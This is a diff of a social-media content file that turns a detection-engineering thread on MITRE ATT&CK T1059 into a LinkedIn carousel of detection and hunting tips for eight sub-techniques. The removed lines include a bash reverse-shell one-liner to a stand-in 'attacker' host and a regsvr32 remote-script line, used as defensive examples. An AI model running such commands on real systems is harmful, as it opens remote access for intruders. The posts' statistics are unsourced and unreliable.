@@ -1,92 +1,108 @@
 ---
 slug: mofu-02-mitre-attck-t1059
-title: 'MITRE ATT&CK T1059: Command & Scripting — How to Detect It'
+title: MITRE T1059: Catch Every Scripting Attack
 funnel: mofu
-platform: twitter
-format: thread
+platform: linkedin
+format: carousel
 hook: how-to
-persona: Mid-Level Detection Engineer
-hashtags: MITRE, ATT&CK, detection, threatintel, YARA
-cta: Follow for one detection technique every week
-notes: Technical deep-dive thread. Each tweet is one aspect of T1059. Mixes education with actionable detection guidance.
+persona: Detection Engineer
+hashtags: cybersecurity, MITRE, ATT&CK, T1059, detection-engineering
+cta: Save this. The Sigma rule pack with all 8 sub-techniques drops in the next post.
+notes: How-to hook. Framework variant = 8 sub-techniques in a 2x4 grid. Each card = technique + 1 detection idea.
 ---
 
-T1059: Command and Scripting Interpreter.
-
-It's the #1 technique in real-world attacks.
-
-## Here's how to detect what your SIEM is probably missing. 🧵
-
-What is T1059?
-
-Attackers use built-in scripting tools (PowerShell, Python, Bash, JavaScript) to execute malicious code.
-
-## No malware needed. No files dropped. Living off the land.
-
-Why it's dangerous:
-
-• Runs in trusted processes (powershell.exe, python.exe)
-• Often passes signature-based detection
-• Executes in memory (no disk artifacts)
-• 70% of APT groups use it (MITRE data)
+MITRE T1059: Command and Scripting Interpreter.
+8 sub-techniques. One technique covers 40% of all endpoint attacks.
 
 ---
 
-PowerShell — the #1 offender:
+KIND: framework
+T1059.001: PowerShell
+Still the #1 attacker tool after 15 years.
 
-• -EncodedCommand (base64 obfuscated payloads)
-• -ExecutionPolicy Bypass
-• Download cradles (IEX, Net.WebClient)
-• AMSI bypass attempts
-
----
-
-Detection rule (Sigma):
-
-title: Encoded PowerShell Command
-detection:
-selection:
-EventID: 4104
-ScriptBlockText|contains: '-EncodedCommand'
-condition: selection
-level: high
+- Encoded commands (-enc), download cradles (Net.WebClient)
+- AMSI bypass attempts: amsiInitFailed, ScriptBlockText logging gaps
+- Detection: enable PowerShell ScriptBlock + Module logging (event 4104)
+- Hunt: powershell.exe spawning from non-admin users with -enc
 
 ---
 
-Python/Bash — the Linux blind spot:
+KIND: framework
+T1059.002: AppleScript
+macOS attackers' favorite, often missed by EDR.
 
-• Most SIEMs focus on Windows
-• python -c 'import os; os.system("...")'
-• bash -i >& /dev/tcp/attacker/4444 0>&1
-• Cron job persistence via scripting
-
----
-
-JavaScript — the fileless threat:
-
-• wscript.exe / cscript.exe execution
-• mshta.exe loading remote HTA files
-• Node.js spawning child processes
-• LOLBAS: regsvr32 /s /n /u /i:URL scrobj.dll
+- osascript -e, .scpt files, embedded in .app bundles
+- Used in 3CX, Atomic Stealer, and most macOS-targeted ops
+- Detection: Unified Log stream "osascript" + "exec" events
+- Hunt: osascript spawning curl, wget, or /usr/bin/python
 
 ---
 
-5 detection rules to write today:
+KIND: framework
+T1059.003: Windows Command Shell
+cmd.exe — the old reliable, still everywhere.
 
-1. PowerShell encoded command execution
-2. Python/bash spawning network connections
-3. WScript/CScript with remote URLs
-4. MSHTA loading external content
-5. Script interpreter → credential access tool
+- Living-off-the-land: whoami, net, ipconfig, nltest, dsquery
+- Detection: Sysmon Event 1 (process create) + parent-child correlation
+- Hunt: cmd.exe spawned by Office apps, browsers, or PDF readers
+- Pair with 4688 with command-line auditing enabled
 
 ---
 
-The key insight:
+KIND: framework
+T1059.004: Unix Shell
+bash on Linux and macOS, often not logged.
 
-Don't detect the script — detect the BEHAVIOR.
+- Reverse shells, curl-to-bash, base64-encoded payloads
+- Detection: auditd execve + syscall monitoring, or Falco rules
+- Hunt: bash spawned by www-data, nginx, or systemd services
+- Enable shell history forwarding to a central log shipper
 
-## A PowerShell download cradle is suspicious. PowerShell itself is not. Context is everything.
+---
 
-CTA: Follow @pranithjain for weekly detection engineering threads.
+KIND: framework
+T1059.005: Visual Basic
+Office macros are still the #1 phishing payload.
 
-#MITRE #ATTCK #detection #threatintel #YARA
+- .docm, .xlsm, .pptm with AutoOpen / Document_Open triggers
+- AMSI scans macros in Office 365 — but only if macros are enabled
+- Detection: Office spawns wscript, cscript, powershell, or mshta
+- Hunt: any Office file write to %TEMP% followed by a script engine
+
+---
+
+KIND: framework
+T1059.006: Python
+The cross-platform payload language of 2024.
+
+- pyinstaller EXEs, base64-encoded .py in clipboard, or direct exec
+- Detection: Sysmon Event 1 for python.exe + parent process
+- Hunt: python.exe spawned by Office, browsers, or LOLBins
+- Watch for python.exe in user-writable paths (AppData, Downloads)
+
+---
+
+KIND: framework
+T1059.007: JavaScript
+Browser-based + Node.js for desktop-side ops.
+
+- Malicious npm packages, prototype pollution, JScript on Windows
+- Detection: Sysmon for cscript / wscript + JScript engine events
+- Hunt: cscript.exe spawning from Office, .js in startup folders
+- Watch for unusual Node.js processes (parent != IDE or build tool)
+
+---
+
+KIND: framework
+T1059.008: Network Device CLI
+The one everyone forgets until Cisco gets popped.
+
+- Cisco IOS, Junos, Arista EOS — often no EDR coverage at all
+- Detection: TACACS+/RADIUS accounting logs + syslog forwarding
+- Hunt: configuration changes outside change windows
+- Backup configs + git diff them. Catch unauthorized changes fast.
+
+---
+
+CTA: Save this.
+Next post: full Sigma rule pack for all 8 sub-techniques — one rule per technique, tested.
